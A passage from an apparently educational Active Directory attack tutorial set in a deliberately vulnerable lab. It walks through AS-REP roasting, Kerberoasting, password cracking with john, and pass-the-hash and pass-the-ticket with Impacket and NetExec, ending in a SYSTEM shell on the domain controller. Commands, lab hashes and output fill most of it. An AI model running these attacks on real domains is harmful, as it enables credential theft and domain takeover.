<p>This attack worked because we are in a deliberately vulnerable lab. While this scenario could occur in the real world, a user with the <code>UF_DONT_REQUIRE_PREAUTH</code> attribute set doesn't necessarily mean that their password can be cracked. Users tend to use strong passwords, and even if the password is not very strong, it may not be included in any of the password lists you use to crack them.</p><br/>
<p>You can also exploit this attack while performing the <strong>Kerberos Brute Force</strong> attack, since <code>kerbrute</code> also returns the encrypted session key if a <code>KRB_AS_REP</code> message is returned:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">kerbrute</span> <span class="n">userenum</span> <span class="o">--</span><span class="n">dc</span> <span class="mf">192.168.100.1</span> <span class="o">-</span><span class="n">d</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="n">Names</span><span class="o">/</span><span class="n">names</span><span class="o">.</span><span class="n">txt</span>

    <span class="n">__</span>             <span class="n">__</span>               <span class="n">__</span>     
   <span class="o">/</span> <span class="o">/</span><span class="n">_____</span>  <span class="n">_____</span><span class="o">/</span> <span class="o">/</span><span class="n">_</span>  <span class="n">_______</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span><span class="n">____</span> 
  <span class="o">/</span> <span class="o">//</span><span class="n">_</span><span class="o">/</span> <span class="n">_</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="n">__</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="n">__</span><span class="o">/</span> <span class="n">_</span> \
 <span class="o">/</span> <span class="p">,</span><span class="o">&lt;</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="n">__</span><span class="o">/</span>
<span class="o">/</span><span class="n">_</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="o">/</span><span class="n">_</span><span class="o">.</span><span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">/</span>\<span class="n">__</span><span class="o">/</span>\<span class="n">___</span><span class="o">/</span>                                        

<span class="n">Version</span><span class="p">:</span> <span class="n">dev</span> <span class="p">(</span><span class="n">n</span><span class="o">/</span><span class="n">a</span><span class="p">)</span> <span class="o">-</span> <span class="mi">12</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span> <span class="n">Ronnie</span> <span class="n">Flathers</span> <span class="nd">@ropnop</span>

<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">57</span> <span class="o">&gt;</span>  <span class="n">Using</span> <span class="n">KDC</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">57</span> <span class="o">&gt;</span>     <span class="mf">192.168.100.1</span><span class="p">:</span><span class="mi">88</span>

<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">57</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">arthur</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">58</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">ellie</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">59</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">jack</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">59</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">joaquin</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">59</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">joel</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">59</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">john</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">00</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span</span> <span class="nd">peter</span> <span class="nd">has</span> <span class="nd">no</span> <span class="nd">pre</span> <span class="nd">auth</span> <span class="nd">required</span><span class="nd">.</span> <span class="nd">Dumping</span> <span class="nd">hash</span> <span class="nd">to</span> <span class="nd">crack</span> <span class="nd">offline</span><span class="nd">:</span>
<span class="n">$</span><span class="n">krb5asrep</span><span class="n">$</span><span class="mi">18</span><span class="n">$</span><span class="n">peter</span><span class="n">@ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span><span class="n">db97b9080ba8c23d6649ed0429dd6a7c</span><span class="n">$</span><span class="mf">6160e932659</span><span class="n">d104396d9f2b22ff7e3dbb10f4d907e98e84f5664585997b6afc54754c4329c996951dc815d663b3e063bfbebbf9d0a3d0528e476d52d62dfc4a532a31f51f5aec55ed92f27ac4f8729716f41d639191417d92963d92099bb82194bfd06efc6a06f9d534b3c5e1588b781027c8fd2e5e1088596414513f12a4806354e9aaccd767e10085ba8538754d2f72723426f023af86f90e6f38f7017e16b781bf42e6b8e53826e9116d03a1e19a82cfb92f6e6b03eabc1ae992a7db8b05e879e8c33ba99812f016c4dbc9c8246df08a37953c3162dc9c223742513b0ea4e1a0b10a7ecedb6327d4aa8dd1f7a2b7d40f3ef20cf24a28300e633c92619cdb87a2fa1b23407a5c5</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">00</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">peter</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">19</span> <span class="mi">20</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">01</span> <span class="o">&gt;</span>  <span class="n">Done</span><span class="n">!</span> <span class="n">Tested</span> <span class="mi">10177</span> <span class="n">usernames</span> <span class="p">(</span><span class="mi">7</span> <span class="n">valid</span><span class="p">)</span> <span class="ow">in</span> <span class="mf">4.074</span> <span class="n">seconds</span>
</pre></div>
<p>As observed, it returns the hash in the same format as <code>GetNPUsers.py</code>, so you can copy it and crack it using <code>john</code> in the same way. This didn't work earlier because <code>peter</code> didn't have the <code>UF_DONT_REQ_PREAUTH</code> attribute set when I was explaining the <strong>Kerberos Brute Force</strong> attack.</p><br/>
<br/><h2>Kerberoasting</h2><br/>
<p>This attack is similar to <strong>AS-REP Roasting</strong>, but instead of exploiting the <code>KRB_AS_REP</code> response and the <code>UF_DONT_REQUIRE_PREAUTH</code> attribute, it targets the <code>KRB_TGS_REP</code> response.</p><br/>
<p>When requesting a Service Ticket (ST) from the KDC, the user must send a valid TGT  along with the <code>SPN</code> of the desired service.
</p><br/><p><img src="https://elswix.github.io/articles/13/img/3.png"/></p><br/>
If the TGT is valid and the service exists, the KDC will issue the Service Ticket (ST) to the requesting user embedded in a <code>KRB_TGS_REP</code> message.</p><br/>
<h3 class="note">Note</h3><br/>
<p>When explaining the <code>KRB_TGS_REQ</code> message earlier, I forgot to mention that the <code>SPN</code> is not necessarily the exact information included in the message to specify the service. It can actually be the <code>sAMAccountName</code>. The field used is called <code>sname</code> (Service Name) rather than <code>SPN</code>. However, in practice, the <code>SPN</code> is typically provided in the <code>sname</code> field to specify the service.</p><br/>
<p>To recap, the <code>KRB_TGS_REP</code> contains a <strong>Service Ticket</strong>, which is encrypted using the <strong>Service Master Key</strong> (the NT hash of the service owner's account). This attack involves obtaining the <strong>Service Ticket</strong> and attempting to decrypt it via a password brute-force attack. If the decryption is successful, it indicates that the password for the service owner's account has been compromised.</p><br/>
<p>However, exploiting this vulnerability is not straightforward. Typically, the owners of services are the machines on which these services run, and since computer passwords tend to be highly complex, attempting to crack them is usually ineffective. The same applies to the <code>krbtgt</code> account, meaning the TGT (Ticket Granting Ticket) is also not susceptible to cracking through this method.</p><br/>
<p>Kerberos can issue service tickets even if the service has no <code>SPN</code> at all, but in this case, the service's <code>sAMAccountName</code> must end with a <code>$</code>. However, when this occurs, it’s difficult to determine with certainty whether the service’s password is defined by a human. Kerberoasting attacks typically target user accounts with at least one <code>SPN</code> (Service Principal Name), as these are more likely to have human-defined passwords.</p><br/>
<h3 class="note">Note</h3><br/>
<p>Just in case you're not familiar, the <code>sAMAccountName</code> is the legacy username associated with a user or service account in Active Directory. It is used primarily for backward compatibility with older systems that rely on the NETLOGON protocol. The <code>sAMAccountName</code> must be unique within the domain and typically follows a simple format. For example, the <code>sAMAccountName</code> of the built-in administrator account is <code>administrator</code>. </p><br/>
<h3>Abuse</h3><br/>
<p>To execute this attack, valid credentials are required, as a TGT must be provided in the <code>KRB_TGS_REQ</code> message.</p><br/>
<p>For this demonstration, we will use the <code>GetUserSPNs.py</code> script from the <a href="https://github.com/fortra/impacket">Impacket</a> suite along with the credentials for the user <code>peter</code>, which were obtained in the previous attack.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">peter</span><span class="p">:</span><span class="s1">'cr4ckthis4n!c%'</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20241024.85237</span><span class="o">.</span><span class="n">db71504</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="n">ServicePrincipalName</span>  <span class="n">Name</span>   <span class="n">MemberOf</span>  <span class="n">PasswordLastSet</span>             <span class="n">LastLogon</span>  <span class="n">Delegation</span> 
<span class="o">--------------------</span>  <span class="o">-----</span>  <span class="o">--------</span>  <span class="o">--------------------------</span>  <span class="o">---------</span>  <span class="o">----------</span>
<span class="n">http</span><span class="o">/</span><span class="n">ellie</span>            <span class="n">ellie</span>            <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">17</span> <span class="mi">20</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">44.925164</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>
</pre></div>
<p>As observed, when running the script, it indicates that <code>ellie</code> is potentially vulnerable to Kerberoasting and can obtain a service ticket for that service. To retrieve the <strong>Service Ticket</strong> and subsequently crack it, we need to provide the <code>-request</code> parameter:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">peter</span><span class="p">:</span><span class="s1">'cr4ckthis4n!c%'</span> <span class="o">-</span><span class="n">request</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20241024.85237</span><span class="o">.</span><span class="n">db71504</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="n">ServicePrincipalName</span>  <span class="n">Name</span>   <span class="n">MemberOf</span>  <span class="n">PasswordLastSet</span>             <span class="n">LastLogon</span>  <span class="n">Delegation</span> 
<span class="o">--------------------</span>  <span class="o">-----</span>  <span class="o">--------</span>  <span class="o">--------------------------</span>  <span class="o">---------</span>  <span class="o">----------</span>
<span class="n">http</span><span class="o">/</span><span class="n">ellie</span>            <span class="n">ellie</span>            <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">20</span> <span class="mi">00</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">52.772910</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>               



<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">CCache</span> <span class="n">file</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">found</span><span class="o">.</span> <span class="n">Skipping</span><span class="o">...</span>
<span class="n">$</span><span class="n">krb5tgs</span><span class="n">$</span><span class="mi">23</span><span class="n">$</span><span class="o">*</span><span class="n">ellie</span><span class="n">$</span><span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span><span class="n">$</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">ellie</span><span class="o">*</span><span class="n">$</span><span class="n">d2165b51ef5f747c7bf81e2a16ee11af</span><span class="n">$</span><span class="n">c049024e77197bfbb52ab5eea</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">cb0bc60cc997</span>
</pre></div>
<p>As observed, it is a very long hash, which is essentially the encrypted Service Ticket. Now, let's save it to a file and crack it using <code>john</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Leaked</span><span class="o">-</span><span class="n">Databases</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">hashfile</span>
<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">krb5tgs</span><span class="p">,</span> <span class="n">Kerberos</span> <span class="mi">5</span> <span class="n">TGS</span><span class="o">-</span><span class="n">REP</span> <span class="n">etype</span> <span class="mi">23</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="n">RC4</span><span class="p">])</span>
<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="s1">'h'</span> <span class="k">for</span> <span class="n">help</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>

<span class="o">~</span><span class="n">smelly_ell1e</span><span class="o">~</span>   <span class="p">(</span><span class="n">?</span><span class="p">)</span>     

<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">02</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">20</span> <span class="mi">00</span><span class="p">:</span><span class="mi">07</span><span class="p">)</span> <span class="mf">0.4831</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">1191</span><span class="n">Kp</span><span class="o">/</span><span class="n">s</span> <span class="mi">1191</span><span class="n">Kc</span><span class="o">/</span><span class="n">s</span> <span class="mi">1191</span><span class="n">KC</span><span class="o">/</span><span class="n">s</span> <span class="o">~~</span><span class="n">fabivo</span><span class="o">~~</span><span class="mf">123.</span><span class="o">.~</span><span class="n">gurls</span><span class="o">~</span>
<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
</pre></div>
<p>Great! The hash was successfully cracked, and we obtained <strong>Ellie's</strong> password. Now, let's use <code>NetExec</code> again to verify it:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.1</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'ellie'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'~smelly_ell1e~'</span>
<span class="ow">SMB</span>         <span class="mf">192.168.100.1</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="ow">SMB</span>         <span class="mf">192.168.100.1</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">ellie</span><span class="p">:</span><span class="o">~</span><span class="n">smelly_ell1e</span><span class="o">~</span>
</pre></div>
<h3 class="note">Note</h3><br/>
<p>Once again, this attack was successful because we are working in a deliberately vulnerable lab environment. While this scenario could occur in the real world, an account with an SPN doesn’t necessarily mean its password can be cracked. Users often employ strong passwords, and even if the password isn’t very strong, it may not be included in any of the password lists you use for cracking.</p><br/>
<br/><h2>Overpass The Hash/Pass The Key</h2><br/>
<p>Before diving into the <strong>Silver/Golden Ticket</strong> topic, let’s first cover the <strong>Overpass The Hash/Pass The Key</strong> technique.</p><br/>
<p>As explained in the previous article, the <strong>Overpass The Hash</strong> attack allows an attacker to authenticate to Kerberos services without needing the user’s plaintext password. Instead, the attacker uses the <strong>NT hash</strong> (a cryptographic representation of the password) to request a <strong>TGT</strong> from the <strong>KDC</strong>. When the client sends a <code>KRB_AS_REQ</code> message, it encrypts a <code>Timestamp</code> field with the user's NT hash, proving possession of the credentials without transmitting the plaintext password. If the KDC can decrypt the timestamp using the stored NT hash, it issues a TGT.</p><br/>
<p>In practice, this technique is always performed in conjunction with the KDC. Even if a plaintext password is provided, the tool requesting the <code>TGT</code> will convert it into an NT hash (or another key type) to encrypt the timestamp.</p><br/>
<p>Kerberos also supports other encryption keys, such as AES, for stronger security. The <code>KRB_AS_REQ</code> message includes an <strong>EncryptionType (etype)</strong> field to specify which algorithm was used to encrypt the timestamp. The KDC uses this to select the appropriate key type (e.g., NT hash, AES128, or AES256) and attempts to decrypt the timestamp. If successful, and the timestamp is valid, a TGT is issued.</p><br/>
<p>But when would you obtain these hashes instead of the plaintext password? As an attacker, you might gain access to an account with high or valuable privileges. If that account has sufficient rights to perform a <strong>DCSync</strong> attack (which we’ll cover in a future article), you can retrieve all user passwords in cryptographic formats, such as <strong>NT hashes</strong> or <strong>AES keys</strong>.</p><br/>
<p>Once you have these hashes, you might attempt to crack them in order to recover the plaintext password. However, the password could be very strong or unique, making it difficult to crack, especially if it isn’t in your password list. This is where Kerberos comes in: even if you can't recover the plaintext password, you can still use these hashes to authenticate against the KDC during the <strong>KRB_AS_REQ</strong> stage, as previously explained.</p><br/>
<h3>Abuse</h3><br/>
<p>Well, this technique is not difficult to execute. Imagine we succeeded with a <code>DCSync</code> attack and obtained the keys for every user. For example, for the administrator user:</p><br/>
<div class="highlight"><pre><span></span><span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">0</span><span class="n">d3b023fde5f62a291b5fd1dbcdd352f</span><span class="p">:::</span>
<span class="n">Administrator</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">9734</span><span class="n">aeda304db0b0540ddd9c399e9fff88f9dd042e7a017733c0d4f66a63e8d3</span>
<span class="n">Administrator</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">142</span><span class="n">a294e633f4e74a608aba133c6845f</span>
</pre></div>
<p>If you try to crack them, you'll notice it's impossible, at least with common password lists like <code>rockyou.txt</code>. However, instead of cracking, you can use these hashes to authenticate. For example, let's use <code>NetExec</code> to verify if these credentials are valid, and I'll provide the <code>-H</code> parameter to specify the NT hash:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.1</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'administrator'</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'0d3b023fde5f62a291b5fd1dbcdd352f'</span>
<span class="ow">SMB</span>         <span class="mf">192.168.100.1</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="ow">SMB</span>         <span class="mf">192.168.100.1</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">administrator</span><span class="p">:</span><span class="mi">0</span><span class="n">d3b023fde5f62a291b5fd1dbcdd352f</span> <span class="evrm">(</span><span class="evrm">Pwn3d</span><span class="evrm">!</span><span class="evrm">)</span>
</pre></div>
<p>As observed, the authentication was successful. We have successfully authenticated against the SMB service using the NT hash.</p><br/>
<p>Impacket tools also allow you to perform Pass-the-Hash attacks. For example, we can use <code>psexec.py</code> to obtain a shell, as we are authenticated as the administrator:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">psexec</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">administrator</span><span class="o">@</span><span class="mf">192.168.100.1</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">0</span><span class="n">d3b023fde5f62a291b5fd1dbcdd352f</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="mf">192.168.100.1</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="n">$</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">tyPktYXT</span><span class="o">.</span><span class="n">exe</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="mf">192.168.100.1</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">dQwc</span> <span class="n">on</span> <span class="mf">192.168.100.1</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">dQwc</span><span class="o">.....</span>
<span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.587</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">Windows</span><span class="evrm">\</span><span class="evrm">system32</span><span class="evrm">&gt;</span> <span class="n">whoami</span> 
<span class="n">nt</span> <span class="n">authority</span><span class="n">\</span><span class="n">system</span>

<span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">Windows</span><span class="evrm">\</span><span class="evrm">system32</span><span class="evrm">&gt;</span>
</pre></div>
<p>This is great! However, these demonstrations only involve the SMB service and NTLM authentication, which are useful, but now let's demonstrate how to use Kerberos authentication.  </p><br/>
<h3>Pass The Ticket (PTT)</h3><br/>
<p>To use Kerberos authentication, tickets are essential, as they play a crucial role in the protocol. The <strong>Pass-the-Ticket</strong> technique involves requesting a ticket from the KDC and then using it for authentication instead of entering passwords.</p><br/>
<p>For example, if we want to use <code>psexec.py</code> to gain access to the system, the first step is to request a TGT from the KDC. This can be done using <code>getTGT.py</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">getTGT</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">administrator</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">0</span><span class="n">d3b023fde5f62a291b5fd1dbcdd352f</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
